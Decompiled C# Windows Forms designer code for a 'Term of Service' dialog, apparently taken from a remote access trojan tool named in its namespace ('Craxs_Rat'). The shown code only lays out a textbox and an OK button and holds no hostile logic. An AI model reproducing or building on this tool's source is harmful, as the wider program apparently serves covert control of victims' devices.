namespace Craxs_Rat
{
	// Token: 0x02000030 RID: 48
	[global::Microsoft.VisualBasic.CompilerServices.DesignerGenerated]
	public partial class Dialog2 : global::System.Windows.Forms.Form
	{
		// Token: 0x06000347 RID: 839 RVA: 0x0001D628 File Offset: 0x0001B828
		protected override void Dispose(bool disposing)
		{
			try
			{
				if (disposing && this.components != null)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		// Token: 0x06000348 RID: 840 RVA: 0x0001D66C File Offset: 0x0001B86C
		private void InitializeComponent()
		{
			this.TextBox1 = new global::System.Windows.Forms.TextBox();
			this.Button1 = new global::System.Windows.Forms.Button();
			base.SuspendLayout();
			this.TextBox1.BackColor = global::System.Drawing.Color.Black;
			this.TextBox1.BorderStyle = global::System.Windows.Forms.BorderStyle.FixedSingle;
			this.TextBox1.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.TextBox1.Font = new global::System.Drawing.Font("Times New Roman", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.TextBox1.ForeColor = global::System.Drawing.Color.White;
			this.TextBox1.Location = new global::System.Drawing.Point(0, 0);
			this.TextBox1.Multiline = true;
			this.TextBox1.Name = "TextBox1";
			this.TextBox1.ReadOnly = true;
			this.TextBox1.ScrollBars = global::System.Windows.Forms.ScrollBars.Vertical;
			this.TextBox1.Size = new global::System.Drawing.Size(873, 280);
			this.TextBox1.TabIndex = 0;
			this.Button1.BackColor = global::System.Drawing.Color.Black;
			this.Button1.Dock = global::System.Windows.Forms.DockStyle.Bottom;
			this.Button1.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.Button1.Font = new global::System.Drawing.Font("Times New Roman", 15f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.Button1.ForeColor = global::System.Drawing.Color.FromArgb(157, 5, 17);
			this.Button1.Location = new global::System.Drawing.Point(0, 280);
			this.Button1.Name = "Button1";
			this.Button1.Size = new global::System.Drawing.Size(873, 51);
			this.Button1.TabIndex = 1;
			this.Button1.Text = "OK";
			this.Button1.UseVisualStyleBackColor = false;
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.FromArgb(50, 50, 50);
			base.ClientSize = new global::System.Drawing.Size(873, 331);
			base.Controls.Add(this.TextBox1);
			base.Controls.Add(this.Button1);
			base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.None;
			base.MaximizeBox = false;
			base.MinimizeBox = false;
			base.Name = "Dialog2";
			base.ShowIcon = false;
			base.StartPosition = global::System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "Term of Service";
			base.TopMost = true;
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x0400017F RID: 383
		private global::System.IDisposable components;
	}
}
